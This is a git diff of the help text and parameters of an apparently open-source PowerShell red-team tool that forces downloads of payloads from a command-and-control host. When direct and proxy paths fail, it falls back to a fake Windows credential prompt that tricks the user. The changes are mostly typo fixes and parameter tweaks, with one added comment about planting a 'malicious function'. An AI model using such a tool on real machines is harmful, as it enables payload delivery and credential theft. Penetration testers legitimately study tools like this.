@@ -6,7 +6,7 @@ function Invoke-ForceWebRequest {
         Force HTTP GET in a computer with unknow internet config, trying to download the URL by downloading it directly and if it can't then using default proxy credentials and .pac proxy list. If none o them works, it will trick the user and request his credentials using the Windows default credential prompt.
 
     .PARAMETER URL
-        [String], required=true
+        [String], required=true, ValueFromPipeline=true
 
         URL to download. e.g.: comandandcontrol.com/payload.txt
 
@@ -19,8 +19,9 @@ function Invoke-ForceWebRequest {
     .PARAMETER DummyString
         [String], required=false
 
-        String that will be cheked if it is in DummyURL URL. We do that because sometimes proxys returns 200 OK to all requested sites but with a fake content.
+        String that will be checked if it is in DummyURL URL. We do that because sometimes proxys returns 200 OK to all requested sites but with a fake content.
         E.g.: use the name of a function you know is in DummyURL.
+        By default, DummyString will be 'dummystring', so you could include that string in your malicious function un DummyURL.
 
     .OUTPUTS
         [PSObject]
@@ -29,7 +30,6 @@ function Invoke-ForceWebRequest {
         ---------- -------
               200  <!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="es"><head><meta content="IE=edge" http-equiv="X-UA-Co...
 
-
     .EXAMPLE
         PS C:\> . .\Invoke-ForceWebRequest.ps1
         PS C:\> Invoke-ForceWebRequest google.com -DummyString html -Verbose
@@ -37,7 +37,8 @@ function Invoke-ForceWebRequest {
 
         StatusCode Content
         ---------- -------
-            200 <!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="es"><head><meta content="IE=edge" http-equiv="X-UA-Co...
+               200 <!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="es"><head><meta content="IE=edge" http-equiv="X-UA-Co...
+
     .EXAMPLE
         From a red-team point of view, running this code on a target machine:
 
@@ -51,6 +52,7 @@ function Invoke-ForceWebRequest {
     .LINK
         https://github.com/daniel0x00/forcewebrequest
         https://github.com/enigma0x3/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1 by @enigma0x3
+
     #>
     [CmdletBinding()]
     [OutputType([psobject])]
@@ -65,7 +67,7 @@ function Invoke-ForceWebRequest {
         [String]
         $DummyURL,
 
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory=$false)]
         [String]
         $DummyString = 'dummystring'
     )
